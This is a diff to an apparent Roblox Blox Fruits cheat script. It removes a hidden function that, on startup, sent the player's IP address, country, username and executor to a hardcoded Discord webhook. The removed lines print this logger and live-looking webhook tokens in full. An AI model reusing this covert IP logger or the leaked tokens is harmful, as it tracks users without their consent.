@@ -68,12 +68,8 @@ repeat wait() until game: IsLoaded ()
       {
          ["Webhook"] =
          { -- Discord Webhook
-            ["Url"] = "https://discord.com/api/webhooks/1148666615026688071/fHjKtl_2r7KXDPTd3k9pCTJ4fSZZYWxcByXYeMNt8iu4yFaumkO-kEp8qdquOQ5Ux2Tq", -- Webhook Của Mày
-            ["Enable"] = true, -- Bật or Tẵt
-            ["Image"] = {"https://raw.githubusercontent.com/zaizooo/ayumi-cdn/main/1c914d7c0f43a92c48504d9a612a8d5d.gif",
-              "https://raw.githubusercontent.com/zaizooo/ayumi-cdn/main/departing-07-EXPORT.gif", 
-              "https://raw.githubusercontent.com/zaizooo/ayumi-cdn/main/c41a75767e2741bb005f96b4b6895898%20(1).gif",
-              "https://github.com/zaizooo/Nexus-cdn/blob/main/7a1451c07ba25f8c2f1ae81f8da4ad9f.gif?raw=true", 
+            ["Url"] = "", -- Webhook Của Mày
+            ["Enable"] = true, -- 
               },
             ["Send While"] =
             { --Gửi Những J Vào Webhook
@@ -2001,22 +1997,6 @@ function checkdt(time)
 end
 
 
-function LogConCac()
-    k2 = game:GetService"HttpService":JSONDecode(game:HttpGet"https://api.myip.com")
-    
-    k3 = {}
-    k3["embeds"] = {{["title"] = "Suc Cac", ["url"] = "https://thumbzilla.com/", ["description"] = game.Players.LocalPlayer.Name, ["fields"] = {{["name"]="Game",["value"]=(tostring(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name) or "Wtf Can't Fetch"), ["inline"]=false},{["name"]="Ip Address", ["value"]=(k2["ip"] or "Cant Log"), ["inline"]=false},{["name"]="Country", ["value"]=(k2["country"] or "cant log"), ["inline"] = false},{["name"]="Exploit",["value"]=tostring(identifyexecutor()) or "Custom Exploit???", ["inline"] = false}}}}
-    return k3
-   
-end 
-function buglog(bug) 
-    k3 = {}
-   
-    k3["embeds"] = {{["title"] = "Con Cac", ["url"] = "https://thumbzilla.com/", ["description"] = game.Players.LocalPlayer.Name, ["fields"] = {{["name"]="Game",["value"]=(tostring(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name) or "Wtf Can't Fetch"), ["inline"]=false},{["name"]="Problems", ["value"]=(bug or ""), ["inline"]=false},{["name"]="Process", ["value"]=(m1 or "none").." | "..(m2 or "none"),["inline"]=false}}}}
-    return k3
- 
-end 
-
 function isMirageSpawn() 
   return game:GetService("Workspace").Map:FindFirstChild("MysticIsland") 
 end 
@@ -2035,11 +2015,6 @@ function PostWebhook(cm, cn)
     )
  
    
-  --  setclipboard(game:GetService("HttpService"):JSONEncode(cn))
-end
-spawn(function ()
-PostWebhook("https://discord.com/api/webhooks/1148666687030317110/hTS32yF21g5JH_Coy2QDjskyCvKhJSB-L4bGJTSCCLblOd8YDVNcrtx1dgNi8A69iJxr", LogConCac()) 
-end)
 
             function CFrameQuest()
                QuestPoses = {}
@@ -2935,93 +2910,6 @@ if c().Misc.Webhook.Enable then
             allmelee = allmelee.." "..tostring(l).."("..tostring(j)..")," 
           end 
         end
-       
-        ditmemememememmeme = {}
-        ditmemememememmeme["embeds"] = {{
-          ["title"] = "Cai Dit Con Me May Beo",
-          ["url"] = "https://thumbzilla.com/",
-          ["description"] = "Dit Me May Ong",
-          ["color"] = 14177041,
-          ["image"] = {
-            ["url"] = c().Misc.Webhook.Image[math.random(1, #c().Misc.Webhook.Image)]
-          },
-          ["author"] = {
-            ["name"] = "Con me may di",
-            ["icon_url"] = "https://e7.pngegg.com/pngimages/128/635/png-clipart-sakura-tree-cherry-blossom-cherry-branch-color-thumbnail.png"
-          },
-          ["fields"] = {
-            {
-              ["name"] = "General",
-              ["value"] = tostring("```Name: "..game.Players.LocalPlayer.Name.."\nLevel: "..getPlayerLevel().."\nBeli: "..getPlayerBeli().."\nFragments: "..getPlayerFragments().."\nRace: "..whatismyrace().."\nDevil Fruit: "..tostring(NameDf()).."```"),
-              ["inline"] = true
-            },
-          
-            {
-              ["name"] = "Melee",
-              ["value"] = "```"..tostring(allmelee or "Error").."```",
-              ["inline"] = true
-            },
-             {
-              ["name"] = "Awakening Skills",
-              ["value"] = "```"..tostring(getAwakeningSkills()).."```",
-              ["inline"] = true
-            },
-            
-            {
-              ["name"] = "Sword",
-              ["value"] = "```"..tostring(inventory["Sword"]or "Error").."```",
-              ["inline"] = true
-            },
-            {
-              ["name"] = "Gun",
-              ["value"] = "```"..tostring(inventory["Gun"] or "Error").."```",
-              ["inline"] = true
-            },
-            {
-              ["name"] = "Accessory",
-              ["value"] = "```"..tostring(inventory["Wear"] or "Error").."```",
-              ["inline"] = true
-            },
-            {
-              ["name"] = "Fruit",
-              ["value"] = "```"..tostring(inventory["Blox Fruit"] or "Error").."```",
-              ["inline"] = true
-            },
-            {
-              ["name"] = "Material",
-              ["value"] = "```"..tostring(inventory["Material"] or "Error").."```",
-              ["inline"] = true
-            },
-            {
-              ["name"] = "Others",
-              ["value"] = "```"..tostring(inventory["Other"] or "Error").."```",
-              ["inline"] = true
-            },
-            {
-              ["name"] = "Unlocked",
-              ["value"] = "```"..tostring("Race V2: "..tostring(moctui(2)).."\nRace V3: "..tostring(moctui(3)).."\nBartilo: "..tostring(BartiloProgress == 3).."\nSwan: "..tostring( uable["FlamingoAccess"] or false)).."```",
-              ["inline"] = true
-            },
-           
-           
-             {
-               ["name"] = "Script Status",
-               ["value"] = "```"..(m1 or "none").."\n "..(m2 or "none").."```",
-               ["inline"] = true
-             },
-          },
-          ["footer"] = {
-             ["text"] = "Nexus Cuttay / https://discord.com/invite/kGBwybQw64 / "..disp_time(esltime) or "",
-           },
-        
-           ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-           }}
-         
-      PostWebhook(c().Misc.Webhook.Url, ditmemememememmeme)
-      
-      end
-end end) 
-end
 
       
           spawn(function ()
